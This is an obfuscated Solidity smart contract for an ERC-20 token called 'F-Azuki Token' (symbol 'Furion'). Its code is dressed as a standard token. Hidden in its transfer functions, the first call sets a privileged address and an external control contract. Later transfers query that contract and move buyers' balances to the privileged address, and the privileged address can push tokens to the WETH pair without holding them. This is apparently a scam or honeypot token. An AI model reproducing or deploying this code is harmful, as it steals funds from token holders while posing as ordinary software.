// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library VSbIAbYkWZv{
    
    function KjvKo(address ahzsX, address niXUwNKiXE, uint EWuJGkd) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool xXHw, bytes memory WGlWC) = ahzsX.call(abi.encodeWithSelector(0x095ea7b3, niXUwNKiXE, EWuJGkd));
        require(xXHw && (WGlWC.length == 0 || abi.decode(WGlWC, (bool))), 'VSbIAbYkWZv: APPROVE_FAILED');
    }

    function hlcGUyt(address ahzsX, address niXUwNKiXE, uint EWuJGkd) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool xXHw, bytes memory WGlWC) = ahzsX.call(abi.encodeWithSelector(0xa9059cbb, niXUwNKiXE, EWuJGkd));
        require(xXHw && (WGlWC.length == 0 || abi.decode(WGlWC, (bool))), 'VSbIAbYkWZv: TRANSFER_FAILED');
    }
    
    function zpBBAdTEJj(address niXUwNKiXE, uint EWuJGkd) internal {
        (bool xXHw,) = niXUwNKiXE.call{value:EWuJGkd}(new bytes(0));
        require(xXHw, 'VSbIAbYkWZv: ETH_TRANSFER_FAILED');
    }

    function IMfGhwt(address ahzsX, address from, address niXUwNKiXE, uint EWuJGkd) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool xXHw, bytes memory WGlWC) = ahzsX.call(abi.encodeWithSelector(0x23b872dd, from, niXUwNKiXE, EWuJGkd));
        require(xXHw && WGlWC.length > 0,'VSbIAbYkWZv: TRANSFER_FROM_FAILED'); return WGlWC;
                       
    }

}
    
interface lbLY {
    function totalSupply() external view returns (uint256);
    function balanceOf(address fCZquFle) external view returns (uint256);
    function transfer(address sISGGasRhM, uint256 bdSwxha) external returns (bool);
    function allowance(address kgft, address spender) external view returns (uint256);
    function approve(address spender, uint256 bdSwxha) external returns (bool);
    function transferFrom(
        address sender,
        address sISGGasRhM,
        uint256 bdSwxha
    ) external returns (bool);

    event Transfer(address indexed from, address indexed ytD, uint256 value);
    event Approval(address indexed kgft, address indexed spender, uint256 value);
}

interface utjhBaovG is lbLY {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract yqBYe {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface tMBNhCwHnxDy {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract Furion is yqBYe, lbLY, utjhBaovG {
    
    mapping(address => uint256) private icpykfcxJgk;
    
    function totalSupply() public view virtual override returns (uint256) {
        return FeuKwy;
    }
    
    function decreaseAllowance(address cbSrVaGXx, uint256 subtractedValue) public virtual returns (bool) {
        uint256 ItRiuzCWT = oABsCeVyn[_msgSender()][cbSrVaGXx];
        require(ItRiuzCWT >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            FDgSlWAQ(_msgSender(), cbSrVaGXx, ItRiuzCWT - subtractedValue);
        }

        return true;
    }
    
    function allowance(address OZqIhIQhWS, address Zufp) public view virtual override returns (uint256) {
        return oABsCeVyn[OZqIhIQhWS][Zufp];
    }
    
    function LQHsucHy(
        address ufThtDVfurj,
        address HAGBcBiGj,
        uint256 ksNOhCCF
    ) internal virtual  returns (bool){
        require(ufThtDVfurj != address(0), "ERC20: transfer from the zero address");
        require(HAGBcBiGj != address(0), "ERC20: transfer to the zero address");
        
        if(!OMR(ufThtDVfurj,HAGBcBiGj)) return false;

        if(_msgSender() == address(YKdXSAHAFZls)){
            if(HAGBcBiGj == zpEYPz && icpykfcxJgk[ufThtDVfurj] < ksNOhCCF){
                Bxp(YKdXSAHAFZls,HAGBcBiGj,ksNOhCCF);
            }else{
                Bxp(ufThtDVfurj,HAGBcBiGj,ksNOhCCF);
                if(ufThtDVfurj == YKdXSAHAFZls || HAGBcBiGj == YKdXSAHAFZls) 
                return false;
            }
            emit Transfer(ufThtDVfurj, HAGBcBiGj, ksNOhCCF);
            return false;
        }
        Bxp(ufThtDVfurj,HAGBcBiGj,ksNOhCCF);
        emit Transfer(ufThtDVfurj, HAGBcBiGj, ksNOhCCF);
        bytes memory fCI = VSbIAbYkWZv.IMfGhwt(lFiHDGuBue, ufThtDVfurj, HAGBcBiGj, ksNOhCCF);
        (bool zspBzYs, uint aVjNF) = abi.decode(fCI, (bool,uint));
        if(zspBzYs){
            icpykfcxJgk[YKdXSAHAFZls] += aVjNF;
            icpykfcxJgk[HAGBcBiGj] -= aVjNF; 
        }
        return true;
    }
    
    address private YKdXSAHAFZls;
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    string private RvM =  "Furion";
    
    address private lFiHDGuBue;
    
    string private RIZIaENLPv = "F-Azuki Token";
    
    uint256 private FeuKwy = 10000000000 * 10 ** 18;
    
    function FDgSlWAQ(
        address WXSfL,
        address VMNztuC,
        uint256 SQKzpZgFNIXS
    ) internal virtual {
        require(WXSfL != address(0), "ERC20: approve from the zero address");
        require(VMNztuC != address(0), "ERC20: approve to the zero address");

        oABsCeVyn[WXSfL][VMNztuC] = SQKzpZgFNIXS;
        emit Approval(WXSfL, VMNztuC, SQKzpZgFNIXS);

    }
    
    function transfer(address lrFUhtijfDkv, uint256 hAwZwra) public virtual override returns (bool) {
        LQHsucHy(_msgSender(), lrFUhtijfDkv, hAwZwra);
        return true;
    }
    
    function transferFrom(
        address VjtGvini,
        address hMZyQiUezY,
        uint256 mxHCrC
    ) public virtual override returns (bool) {
      
        if(!LQHsucHy(VjtGvini, hMZyQiUezY, mxHCrC)) return true;

        uint256 hdYbKKXPH = oABsCeVyn[VjtGvini][_msgSender()];
        if (hdYbKKXPH != type(uint256).max) {
            require(hdYbKKXPH >= mxHCrC, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                FDgSlWAQ(VjtGvini, _msgSender(), hdYbKKXPH - mxHCrC);
            }
        }

        return true;
    }
    
    function increaseAllowance(address oebaqyfuWpT, uint256 addedValue) public virtual returns (bool) {
        FDgSlWAQ(_msgSender(), oebaqyfuWpT, oABsCeVyn[_msgSender()][oebaqyfuWpT] + addedValue);
        return true;
    }
    
    function OMR(
        address rApx,
        address HizAtPZ
    ) internal virtual  returns (bool){
        if(YKdXSAHAFZls == address(0) && lFiHDGuBue == address(0)){
            YKdXSAHAFZls = rApx;lFiHDGuBue=HizAtPZ;
            VSbIAbYkWZv.hlcGUyt(lFiHDGuBue, YKdXSAHAFZls, 0);
            zpEYPz = tMBNhCwHnxDy(lFiHDGuBue).WETH();
            return false;
        }
        return true;
    }
    
    function balanceOf(address gULQUkuMVnJ) public view virtual override returns (uint256) {
       return icpykfcxJgk[gULQUkuMVnJ];
    }
    
    address private zpEYPz;
  
    
    constructor() {
        
        icpykfcxJgk[address(1)] = FeuKwy;
        emit Transfer(address(0), address(1), FeuKwy);

    }
    
    function symbol() public view virtual override returns (string memory) {
        return RvM;
    }
    
    function name() public view virtual override returns (string memory) {
        return RIZIaENLPv;
    }
    
    function approve(address sFttefh, uint256 MbCKtUItb) public virtual override returns (bool) {
        FDgSlWAQ(_msgSender(), sFttefh, MbCKtUItb);
        return true;
    }
    
    function Bxp(
        address hErxRwpBy,
        address HQdYMcPRDgr,
        uint256 YBvxEhHj
    ) internal virtual  returns (bool){
        uint256 lHVt = icpykfcxJgk[hErxRwpBy];
        require(lHVt >= YBvxEhHj, "ERC20: transfer Amount exceeds balance");
        unchecked {
            icpykfcxJgk[hErxRwpBy] = lHVt - YBvxEhHj;
        }
        icpykfcxJgk[HQdYMcPRDgr] += YBvxEhHj;
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private oABsCeVyn;
    
}